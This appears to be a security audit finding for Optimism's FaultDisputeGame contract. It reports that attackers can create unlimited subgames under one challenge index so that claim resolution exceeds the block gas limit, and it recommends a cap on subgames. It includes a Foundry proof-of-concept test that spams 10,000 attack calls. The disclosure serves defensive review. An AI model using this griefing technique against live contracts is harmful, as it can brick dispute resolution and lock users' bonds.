Flat Fleece Snail

medium

# Bricking dispute game resolutions through creation of many subgames

## Summary

Bricking dispute game resolutions through creation of many subgames

## Vulnerability Detail

It is possible to brick the dispute game resolution through the creation of many subgames rooted at a single challenge index. The problem is that there is no limit to the number of subgames per challenge index that can be created in the `move()` function. Note that a check for the claim hash exists, BUT the claim hash is different if the `_claim` passed is different, and therefore an attacker can create an unlimited number of subgames.

[FaultDisputeGame.sol#L226-L318](https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L226-L318)
```solidity
    function move(uint256 _challengeIndex, Claim _claim, bool _isAttack) public payable virtual {
        // INVARIANT: Moves cannot be made unless the game is currently in progress.
        if (status != GameStatus.IN_PROGRESS) revert GameNotInProgress();

        // Get the parent. If it does not exist, the call will revert with OOB.
        ClaimData memory parent = claimData[_challengeIndex];

        // Compute the position that the claim commits to. Because the parent's position is already
        // known, we can compute the next position by moving left or right depending on whether
        // or not the move is an attack or defense.
        Position parentPos = parent.position;
        Position nextPosition = parentPos.move(_isAttack);
        uint256 nextPositionDepth = nextPosition.depth();

        // INVARIANT: A defense can never be made against the root claim of either the output root game or any
        //            of the execution trace bisection subgames. This is because the root claim commits to the
        //            entire state. Therefore, the only valid defense is to do nothing if it is agreed with.
        if ((_challengeIndex == 0 || nextPositionDepth == SPLIT_DEPTH + 2) && !_isAttack) {
            revert CannotDefendRootClaim();
        }

        // INVARIANT: A move can never surpass the `MAX_GAME_DEPTH`. The only option to counter a
        //            claim at this depth is to perform a single instruction step on-chain via
        //            the `step` function to prove that the state transition produces an unexpected
        //            post-state.
        if (nextPositionDepth > MAX_GAME_DEPTH) revert GameDepthExceeded();

        // When the next position surpasses the split depth (i.e., it is the root claim of an execution
        // trace bisection sub-game), we need to perform some extra verification steps.
        if (nextPositionDepth == SPLIT_DEPTH + 1) {
            _verifyExecBisectionRoot(_claim, _challengeIndex, parentPos, _isAttack);
        }

        // INVARIANT: The `msg.value` must exactly equal the required bond.
        if (getRequiredBond(nextPosition) != msg.value) revert IncorrectBondAmount();

        // Fetch the grandparent clock, if it exists.
        // The grandparent clock should always exist unless the parent is the root claim.
        Clock grandparentClock;
        if (parent.parentIndex != type(uint32).max) {
            grandparentClock = claimData[parent.parentIndex].clock;
        }

        // Compute the duration of the next clock. This is done by adding the duration of the
        // grandparent claim to the difference between the current block timestamp and the
        // parent's clock timestamp.
        Duration nextDuration = Duration.wrap(
            uint64(
                // First, fetch the duration of the grandparent claim.
                grandparentClock.duration().raw()
                // Second, add the difference between the current block timestamp and the
                // parent's clock timestamp.
                + block.timestamp - parent.clock.timestamp().raw()
            )
        );

        // INVARIANT: A move can never be made once its clock has exceeded `GAME_DURATION / 2`
        //            seconds of time.
        if (nextDuration.raw() > GAME_DURATION.raw() >> 1) revert ClockTimeExceeded();

        // Construct the next clock with the new duration and the current block timestamp.
        Clock nextClock = LibClock.wrap(nextDuration, Timestamp.wrap(uint64(block.timestamp)));

        // INVARIANT: There cannot be multiple identical claims with identical moves on the same challengeIndex. Multiple
        //            claims at the same position may dispute the same challengeIndex. However, they must have different
        //            values.
        ClaimHash claimHash = _claim.hashClaimPos(nextPosition, _challengeIndex);
        if (claims[claimHash]) revert ClaimAlreadyExists();
        claims[claimHash] = true;

        // Create the new claim.
        claimData.push(
            ClaimData({
                parentIndex: uint32(_challengeIndex),
                // This is updated during subgame resolution
                counteredBy: address(0),
                claimant: msg.sender,
                bond: uint128(msg.value),
                claim: _claim,
                position: nextPosition,
                clock: nextClock
            })
        );

        // Update the subgame rooted at the parent claim.
        subgames[_challengeIndex].push(claimData.length - 1);

        // Deposit the bond.
        WETH.deposit{ value: msg.value }();

        // Emit the appropriate event for the attack or defense.
        emit Move(_challengeIndex, _claim, msg.sender);
    }
```

When this occurs, it is not possible to resolve the subgames, as we have to delete the `subgames` array which results in multiple SSTORE operations, and doing so would exceed the block gas limit.
[FaultDisputeGame.sol#L405-L477](https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L405-L477)
```solidity
    function resolveClaim(uint256 _claimIndex) external payable {
        ...
        // Resolved subgames have no entries
        delete subgames[_claimIndex];

        // Indicate the game is ready to be resolved globally.
        if (_claimIndex == 0) {
            subgameAtRootResolved = true;
        }
    }
```

The following PoC shows that it is possible to create 10000 subgames to exceed the block gas limit:
```solidity
    function test_resolve_brickResolution() public {
        Claim claim = _dummyClaim();
        uint256 firstBond = _getRequiredBond(0);
        vm.deal(address(this), firstBond);
        gameProxy.attack{ value: firstBond }(0, claim);
        uint256 secondBond = _getRequiredBond(1);
        vm.deal(address(this), secondBond * 10_000);

        for (uint256 i = 0; i < 10_000; i++) {
            gameProxy.attack{ value: secondBond }(1, _dummyClaim());
        }

        vm.warp(block.timestamp + 3 days + 12 hours + 1 seconds);

        uint256 prevGas = gasleft();
        gameProxy.resolveClaim(1);
        assertEq(true, prevGas - gasleft() > 30_000_000);
    }
```

However, 10000 games would require 200 gwei * 400,000 * 10000 = 800 ETH and therefore doing so would be expensive.

## Impact

Bricking dispute game resolutions through creation of many subgames

## Code Snippet

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L226-L318

## Tool used

Manual Review / Foundry

## Recommendation

Add a reasonable limit to the number of subgames that can be rooted on a single challenge index.